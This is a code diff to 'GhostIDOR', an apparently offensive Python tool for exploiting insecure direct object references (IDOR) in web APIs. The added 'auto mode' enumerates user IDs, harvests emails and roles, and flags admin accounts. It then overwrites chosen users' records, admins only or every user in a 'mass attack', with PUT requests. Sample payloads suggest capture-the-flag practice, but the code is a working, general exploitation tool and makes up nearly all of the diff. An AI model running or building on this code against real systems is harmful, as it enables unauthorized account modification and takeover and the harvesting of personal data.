@@ -817,64 +817,6 @@ class APIIDORTester:
             print(f"\n{Colors.RED}[!] Successfully exploited UIDs:{Colors.RESET} {', '.join(str(r['uid']) for r in successful)}")
     
 
-    def exploit_user_with_uuid(self, api_url: str, target_uid: str, new_data: Dict = None) -> bool:
-        """Exploit a specific user with their correct UUID"""
-        
-        # Get user data from database
-        if target_uid not in self.user_database:
-            print(f"{Colors.RED}[!] User {target_uid} not found in database{Colors.RESET}")
-            print(f"{Colors.YELLOW}[*] Run enumeration first to discover users{Colors.RESET}")
-            return False
-        
-        user_data = self.user_database[target_uid].copy()
-        
-        print(f"\n{Colors.CYAN}[*] Exploiting user {target_uid}{Colors.RESET}")
-        print(f"  {Colors.CYAN}UUID:{Colors.RESET} {user_data.get('uuid', 'N/A')}")
-        print(f"  {Colors.CYAN}Email:{Colors.RESET} {user_data.get('email', 'N/A')}")
-        print(f"  {Colors.CYAN}Role:{Colors.RESET} {user_data.get('role', 'N/A')}")
-        
-        # Prepare modified data
-        if new_data:
-            user_data.update(new_data)
-        else:
-            # Default: modify 'about' field
-            user_data['about'] = f'EXPLOITED_BY_GHOSTOPS_{int(time.time())}'
-        
-        # Build request URL
-        test_url = self._build_api_url(api_url, 'uid', target_uid)
-        
-        print(f"\n{Colors.YELLOW}[*] Sending PUT request...{Colors.RESET}")
-        
-        try:
-            response = self.session.put(test_url, json=user_data, timeout=10)
-            
-            if response.status_code in [200, 201]:
-                print(f"  {Colors.GREEN}[+] PUT successful: {response.status_code}{Colors.RESET}")
-                
-                # Verify modification
-                verify_resp = self.session.get(test_url, timeout=5)
-                if verify_resp.status_code == 200:
-                    verify_data = json.loads(verify_resp.text)
-                    
-                    # Check if modification worked
-                    if 'EXPLOITED_BY_GHOSTOPS' in str(verify_data.get('about', '')):
-                        print(f"  {Colors.BOLD}{Colors.GREEN}[!] EXPLOITATION SUCCESSFUL!{Colors.RESET}")
-                        print(f"\n{Colors.CYAN}Modified user data:{Colors.RESET}")
-                        for key in ['uid', 'uuid', 'role', 'email', 'full_name', 'about']:
-                            if key in verify_data:
-                                print(f"  {key}: {verify_data[key]}")
-                        return True
-                    else:
-                        print(f"  {Colors.YELLOW}[-] Modification not verified{Colors.RESET}")
-                        return False
-            else:
-                print(f"  {Colors.RED}[-] PUT failed: {response.status_code}{Colors.RESET}")
-                print(f"  {Colors.YELLOW}Response: {response.text[:200]}{Colors.RESET}")
-                return False
-                
-        except Exception as e:
-            print(f"  {Colors.RED}[!] Error: {e}{Colors.RESET}")
-            return False
     
     def run_comprehensive_api_test(self, url: str) -> List[IDORResult]:
         """Run comprehensive API IDOR testing"""
@@ -2529,29 +2471,35 @@ class GhostIDOR:
                 
                 if response.status_code == 200 and len(response.content) > 0:
                     try:
-                        # Check if it's JSON
-                        if 'application/json' in response.headers.get('Content-Type', ''):
+                        # Try to parse as JSON (don't rely only on Content-Type header)
+                        data = None
+                        try:
                             data = json.loads(response.text)
-                            
+                        except:
+                            # Not JSON, skip
+                            pass
+                        
+                        if data and isinstance(data, dict):
                             # Store in user database if it has uid
                             if 'uid' in data or 'id' in data:
                                 user_uid = str(data.get('uid', data.get('id', payload)))
                                 with self.results_lock:
                                     self.user_database[user_uid] = data
-                            
-                            # Print interesting fields
-                            interesting_fields = ['email', 'role', 'full_name', 'about', 'uuid', 'uid']
-                            extracted = {k: v for k, v in data.items() if k in interesting_fields}
-                            if extracted:
-                                print(f"\n{Colors.GREEN}[+] FOUND:{Colors.RESET} {test_url}")
-                                print(f"    {Colors.CYAN}Extracted data:{Colors.RESET}")
-                                for key, value in extracted.items():
-                                    print(f"      {key}: {value}")
+                                
+                                # Print interesting fields
+                                interesting_fields = ['email', 'role', 'full_name', 'about', 'uuid', 'uid']
+                                extracted = {k: v for k, v in data.items() if k in interesting_fields}
+                                if extracted:
+                                    print(f"\n{Colors.GREEN}[+] User {user_uid}:{Colors.RESET}")
+                                    for key, value in extracted.items():
+                                        print(f"    {Colors.CYAN}{key}:{Colors.RESET} {value}")
                         
                         # Try to save as file
                         file_info = self.file_extractor.save_file(response, 'path', payload)
                         saved_file = file_info['filepath']
-                    except:
+                    except Exception as e:
+                        if self.args.verbose:
+                            print(f"\n{Colors.YELLOW}[!] Parse error: {e}{Colors.RESET}")
                         pass
                 
                 result = IDORResult(
@@ -2776,6 +2724,9 @@ class GhostIDOR:
         
         return all_results
     
+
+    
+    
     def print_report(self, results: List[IDORResult]):
         """Print final report"""
         vulnerable_results = [r for r in results if r.vulnerable]
@@ -2857,6 +2808,208 @@ class GhostIDOR:
         if self.args.output:
             self._save_report(results, vulnerable_results)
     
+
+    def exploit_user_with_uuid(self, base_url, uid, payload_data):
+        """Generic exploitation with UUID handling"""
+        print(f"\n{Colors.CYAN}[*] Exploiting user {uid}{Colors.RESET}")
+        
+        if str(uid) not in self.user_database:
+            print(f"{Colors.YELLOW}[*] Fetching user data...{Colors.RESET}")
+            if base_url.endswith('/'):
+                base_url = base_url.rstrip('/')
+            fetch_url = f"{base_url}/{uid}?uid={uid}"
+            try:
+                response = self.session.get(fetch_url, timeout=self.args.timeout)
+                if response.status_code == 200:
+                    self.user_database[str(uid)] = response.json()
+                else:
+                    print(f"{Colors.RED}[!] Could not fetch user: {response.status_code}{Colors.RESET}")
+                    return False
+            except Exception as e:
+                print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
+                return False
+        
+        user_data = self.user_database[str(uid)]
+        if 'uuid' not in user_data:
+            print(f"{Colors.RED}[!] No UUID found{Colors.RESET}")
+            return False
+        
+        exploit_payload = user_data.copy()
+        exploit_payload.update(payload_data)
+        
+        if base_url.endswith('/'):
+            base_url = base_url.rstrip('/')
+        url = f"{base_url}/{uid}?uid={uid}"
+        
+        print(f"  {Colors.DIM}URL: {url}{Colors.RESET}")
+        print(f"  {Colors.DIM}UUID: {user_data['uuid']}{Colors.RESET}")
+        
+        try:
+            response = self.session.put(url, json=exploit_payload, timeout=self.args.timeout)
+            
+            if response.status_code in [200, 201]:
+                print(f"  {Colors.GREEN}[!] EXPLOITATION SUCCESSFUL!{Colors.RESET}")
+                verify = self.session.get(url, timeout=self.args.timeout)
+                if verify.status_code == 200:
+                    verify_data = verify.json()
+                    for key, value in payload_data.items():
+                        if verify_data.get(key) == value:
+                            print(f"  {Colors.GREEN}  ✓ {key} = {value}{Colors.RESET}")
+                return True
+            else:
+                print(f"  {Colors.YELLOW}[-] Failed: {response.status_code}{Colors.RESET}")
+                return False
+        except Exception as e:
+            print(f"  {Colors.RED}[!] Error: {e}{Colors.RESET}")
+            return False
+    
+    def find_admin_users(self):
+        """Find admin users"""
+        admin_keywords = ['admin', 'administrator', 'root', 'superuser', 'web_admin', 'staff_admin']
+        admin_users = {}
+        for uid, user_data in self.user_database.items():
+            role = user_data.get('role', '').lower()
+            if any(kw in role for kw in admin_keywords):
+                admin_users[uid] = user_data
+        return admin_users
+
+    def auto_idor_attack(self):
+        """Complete Auto Mode"""
+        print(f"\n{Colors.BOLD}{Colors.GHOST}╔═══════════════════════════════════════════════════════════════════╗{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.GHOST}║                  GHOSTIDOR AUTO MODE                              ║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.GHOST}╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
+        
+        base_url = self.args.url.replace('/FUZZ', '').rstrip('/')
+        
+        print(f"{Colors.BOLD}{Colors.CYAN}[PHASE 1] DISCOVERY{Colors.RESET}")
+        print(f"{Colors.DIM}{'─'*70}{Colors.RESET}\n")
+        
+        import os
+        if os.path.exists(self.extracted_users_file):
+            print(f"{Colors.GREEN}[+] Found: {self.extracted_users_file}{Colors.RESET}")
+            choice = input(f"{Colors.CYAN}Use existing? (y/n): {Colors.RESET}").strip().lower()
+            if choice == 'y':
+                self.load_extracted_users()
+            else:
+                self.user_database = {}
+        
+        if not self.user_database:
+            print(f"{Colors.BLUE}[*] Starting enumeration...{Colors.RESET}\n")
+            
+            if 'FUZZ' in self.args.url:
+                if not self.args.wordlist:
+                    with open('auto_ids.txt', 'w') as f:
+                        for i in range(1, 101):
+                            f.write(f"{i}\n")
+                    self.args.wordlist = 'auto_ids.txt'
+                    self.args.fuzz_param = 'FUZZ'
+                
+                print(f"{Colors.GREEN}[+] Fuzzing...{Colors.RESET}\n")
+                self.run_all_tests(self.args.url)
+            else:
+                self.args.api_test = True
+                self.run_all_tests(self.args.url)
+        
+        if not self.user_database:
+            print(f"{Colors.RED}[!] No users discovered{Colors.RESET}")
+            return
+        
+        self.save_extracted_users()
+        
+        print(f"\n{Colors.BOLD}{Colors.CYAN}[PHASE 2] ANALYSIS{Colors.RESET}")
+        print(f"{Colors.DIM}{'─'*70}{Colors.RESET}\n")
+        
+        total = len(self.user_database)
+        admins = self.find_admin_users()
+        regular = {k: v for k, v in self.user_database.items() if k not in admins}
+        
+        print(f"{Colors.CYAN}Total: {total} | Admins: {len(admins)} | Regular: {len(regular)}{Colors.RESET}\n")
+        
+        if admins:
+            print(f"{Colors.RED}Admin Users:{Colors.RESET}")
+            for uid, data in admins.items():
+                print(f"  [UID {uid}] {data.get('role', 'N/A'):15s} {data.get('email', 'N/A')}")
+            print()
+        
+        if regular:
+            print(f"{Colors.GREEN}Regular Users (sample):{Colors.RESET}")
+            for uid, data in list(regular.items())[:5]:
+                print(f"  [UID {uid}] {data.get('role', 'N/A'):15s} {data.get('email', 'N/A')}")
+            if len(regular) > 5:
+                print(f"  ... and {len(regular) - 5} more")
+            print()
+        
+        print(f"\n{Colors.BOLD}{Colors.CYAN}[PHASE 3] PLANNING{Colors.RESET}")
+        print(f"{Colors.DIM}{'─'*70}{Colors.RESET}\n")
+        
+        target_type = getattr(self.args, 'attack_target', None)
+        target_uid = None
+        
+        if not target_type:
+            print(f"{Colors.CYAN}Target?{Colors.RESET}")
+            print("  1. Admin users")
+            print("  2. Specific UID")
+            print("  3. All users")
+            print("  4. Exit")
+            choice = input(f"\n{Colors.BOLD}Choice: {Colors.RESET}").strip()
+            
+            if choice == '1':
+                target_type = 'admin'
+            elif choice == '2':
+                target_type = 'single'
+                target_uid = input(f"{Colors.CYAN}UID: {Colors.RESET}").strip()
+            elif choice == '3':
+                target_type = 'all'
+            else:
+                return
+        
+        if target_type == 'single' and not target_uid:
+            target_uid = getattr(self.args, 'target_uid', None) or input(f"{Colors.CYAN}UID: {Colors.RESET}").strip()
+        
+        payload_str = getattr(self.args, 'payload', None)
+        if not payload_str:
+            print(f"\n{Colors.CYAN}Payload (e.g., email=flag@idor.htb):{Colors.RESET}")
+            payload_str = input(f"{Colors.BOLD}> {Colors.RESET}").strip() or "about=EXPLOITED"
+        
+        if '=' not in payload_str:
+            print(f"{Colors.RED}[!] Invalid format{Colors.RESET}")
+            return
+        
+        field, value = payload_str.split('=', 1)
+        payload = {field: value}
+        
+        print(f"\n{Colors.BOLD}{Colors.CYAN}[PHASE 4] EXECUTION{Colors.RESET}")
+        print(f"{Colors.DIM}{'─'*70}{Colors.RESET}\n")
+        
+        import time
+        success = 0
+        
+        if target_type == 'admin':
+            if not admins:
+                print(f"{Colors.RED}[!] No admins{Colors.RESET}")
+                return
+            for uid in admins:
+                if self.exploit_user_with_uuid(base_url, uid, payload):
+                    success += 1
+                time.sleep(0.2)
+        elif target_type == 'single':
+            if self.exploit_user_with_uuid(base_url, target_uid, payload):
+                success = 1
+        elif target_type == 'all':
+            confirm = input(f"{Colors.RED}Mass attack {total} users? (yes/no): {Colors.RESET}")
+            if confirm == 'yes':
+                for uid in self.user_database:
+                    if self.exploit_user_with_uuid(base_url, uid, payload):
+                        success += 1
+                    time.sleep(0.1)
+        
+        print(f"\n{Colors.BOLD}{Colors.CYAN}[PHASE 5] COMPLETE{Colors.RESET}")
+        print(f"{Colors.DIM}{'─'*70}{Colors.RESET}\n")
+        print(f"{Colors.GREEN}✓ Successful: {success}{Colors.RESET}\n")
+        
+        if field == 'email':
+            print(f"{Colors.YELLOW}[*] Check the profile page for your flag!{Colors.RESET}")
+
     def _save_report(self, all_results: List[IDORResult], vulnerable_results: List[IDORResult]):
         """Save report to file"""
         linked_files_count = sum(len(r.linked_files) if r.linked_files else 0 for r in vulnerable_results)
@@ -2908,38 +3061,30 @@ def main():
         epilog=f"""
 {Colors.CYAN}Examples:{Colors.RESET}
 
+  {Colors.BOLD}# Auto Mode - Complete attack wizard{Colors.RESET}
+  python ghostidor_v2.5.py --auto -u "http://target.com/profile/FUZZ"
+
+  {Colors.BOLD}# Auto Mode - Non-interactive{Colors.RESET}
+  python ghostidor_v2.5.py --auto --attack-target admin --payload "email=flag@idor.htb" -u "URL/FUZZ"
+
   {Colors.BOLD}# Fuzz URL parameter with default payloads{Colors.RESET}
-  python ghostidor_v2.3.py -u "http://target.com/docs.php?uid=1" -p uid=FUZZ
+  python ghostidor_v2.5.py -u "http://target.com/docs.php?uid=1" -p uid=FUZZ
 
   {Colors.BOLD}# Fuzz URL parameter with custom wordlist{Colors.RESET}
-  python ghostidor_v2.3.py -u "http://target.com/docs.php?uid=1" -p uid=FUZZ -w ids.txt
+  python ghostidor_v2.5.py -u "http://target.com/docs.php?uid=1" -p uid=FUZZ -w ids.txt
 
-  {Colors.BOLD}# Fuzz POST data parameter{Colors.RESET}
-  python ghostidor_v2.3.py -u "http://target.com/download.php" -m POST \\
-    -d "file_id=123" -p file_id=FUZZ -w wordlist.txt
+  {Colors.BOLD}# Smart Recon (auto JS analysis, encoding detection, pattern exploitation){Colors.RESET}
+  python ghostidor_v2.5.py --smart-recon -u "http://target.com/download.php?file=MQ=="
 
-  {Colors.BOLD}# High-speed fuzzing with 20 threads{Colors.RESET}
-  python ghostidor_v2.3.py -u "http://target.com/api/user?id=1" -p id=FUZZ \\
-    -w ids.txt --threads 20
-
-  {Colors.BOLD}# Fuzz with verbose output and file extraction{Colors.RESET}
-  python ghostidor_v2.3.py -u "http://target.com/file?doc=1" -p doc=FUZZ \\
-    -w numbers.txt -v --output-dir findings/
-
-  {Colors.BOLD}# Test JWT-based IDOR{Colors.RESET}
-  python ghostidor_v2.3.py -u "http://target.com/api/profile" \\
-    -H "Authorization: Bearer eyJ..." --advanced -v
-  
-  {Colors.BOLD}# Full scan with JS analysis and encoding detection{Colors.RESET}
-  python ghostidor_v2.3.py -u "http://target.com" --analyze-js \\
-    --detect-encoding -v -o report.json
+  {Colors.BOLD}# Comprehensive API testing{Colors.RESET}
+  python3 ghostidoor_v2.5_API.py --api-test -u "http://target.com/api/profile" -c "role=employee"
         """
     )
     
     # Required arguments
     parser.add_argument('-u', '--url', required=True, help='Target URL to test')
     
-    # NEW: Fuzzing options
+    # Fuzzing options
     parser.add_argument('-p', '--fuzz-param', 
                        help='Parameter to fuzz (format: param=FUZZ). Works for URL params and POST data')
     parser.add_argument('-w', '--wordlist', 
@@ -2968,6 +3113,16 @@ def main():
                        help='Analyze JavaScript files for IDOR patterns')
     parser.add_argument('--smart-recon', action='store_true',
                        help='Smart reconnaissance mode (auto-enables JS analysis, encoding detection, and pattern exploitation)')
+    
+    # Auto Mode - Intelligent Attack Wizard
+    parser.add_argument('--auto', action='store_true',
+                       help='Auto mode - intelligent IDOR attack wizard (discovery → exploit)')
+    parser.add_argument('--attack-target', choices=['admin', 'single', 'all'],
+                       help='Target type for auto mode (admin/single/all)')
+    parser.add_argument('--payload', type=str,
+                       help='Payload for auto mode (format: field=value, e.g., email=test@site.com)')
+    
+    # API and Exploitation
     parser.add_argument('--api-test', action='store_true',
                        help='Comprehensive API IDOR testing (GET/POST/PUT/DELETE)')
     parser.add_argument('--auto-exploit', action='store_true',
@@ -3008,7 +3163,7 @@ def main():
                        help='Verbose output (shows full request/response for findings)')
     
     # User agent
-    parser.add_argument('--user-agent', default='GhostIDOR/2.3 (Ghost Ops Security)',
+    parser.add_argument('--user-agent', default='GhostIDOR/2.5 (Ghost Ops Security)',
                        help='Custom User-Agent')
     
     args = parser.parse_args()
@@ -3021,6 +3176,12 @@ def main():
     
     try:
         scanner = GhostIDOR(args)
+
+        # Handle Auto Mode
+        if args.auto:
+            scanner.auto_idor_attack()
+            sys.exit(0)
+        
         scanner.extracted_users_file = args.users_file
         
         # Handle extracted users exploitation
